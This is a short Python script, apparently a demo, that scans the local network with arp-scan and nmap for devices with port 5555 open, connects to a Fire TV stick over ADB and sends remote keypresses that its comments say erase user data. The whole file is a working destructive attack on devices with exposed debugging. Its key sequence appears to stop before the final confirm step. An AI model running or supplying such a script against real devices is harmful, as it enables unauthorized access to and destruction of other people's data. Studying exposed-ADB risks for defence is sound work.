# Jacob Ehrlich
# December 12th, 2018
# firetv.py

import nmap
import subprocess
import re

# Using nmap to see if our target port is open
nm = nmap.PortScanner()

# arpscan returns a list of parsed IP addresses on the local network
def arpscan ():
    try:
        print ("Running arp-scan...")
        arpout = subprocess.check_output("sudo arp-scan --localnet", 
                                         shell=True).splitlines()
        ips = []
        for line in arpout:
            line = line.decode("utf-8")
            ip = re.findall(r'(?:\d{1,3}\.){3}\d{1,3}', line)
            if ip != []:
                ips.append(ip[0])
        return ips

    except subprocess.CalledProcessError:
        print ("There are no IP Adresses on your network.")
        exit()

# portscan takes a list of IP addresses and returns the ip with
# port 5555 open (i.e. the IP address of the vulnerable firestick)
def portscan (ips):
    try:
        for ip in ips:
            print ("Scanning " + ip + "...")
            nm.scan(ip, '5555')
            print ("Scan for " + ip + " complete.")
            try: 
                tgt = nm[ip]['tcp'][5555]['state']
                if tgt == 'open':
                    print (ip + " has port 5555 open.")
                    return ip
                else:
                    print (ip + " has TCP but port 5555 is closed")
            except:
                print (ip + " does not have TCP.")
    except:
           print ("Something went wrong in the port scan")
           exit()
    exit()

# connect takes a target IP address and connects to it using adb, then exploits
# the target by erasing all data
def connect (tgt):
    try:
        cmd = "adb connect " + tgt
        adbout = subprocess.check_output(cmd, shell=True).splitlines()
        for line in adbout:
            line = line.decode("utf-8")
            found = line.find("authenticate")
            if found != -1:
                print ("Waiting for user authentication...")
                connect(tgt)
        exploit()
    except:
        print ("ADB failed.")
        exit()

# exploit, through a series of remote commands, erases user data on firestick
def exploit ():
    print ("Exploiting Smart TV... >:-)")

    # delay for demo
    # for x in range(100000):
    #     pass

    cmd   = "adb shell input keyevent "
    home  = cmd + "3"
    up    = cmd + "19"
    down  = cmd + "20"
    left  = cmd + "21"
    right = cmd + "22"
    enter = cmd + "66"
    back  = cmd + "4"
    menu  = cmd + "1"

    for x in range(4):
        subprocess.check_output(home, shell=True)
    for x in range(6):
        subprocess.check_output(right, shell=True)
    subprocess.check_output(down, shell=True)
    for x in range(8):
        subprocess.check_output(right, shell=True)
    subprocess.check_output(enter, shell=True)
    for x in range(6):
        subprocess.check_output(down, shell=True)

connect(portscan(arpscan()))















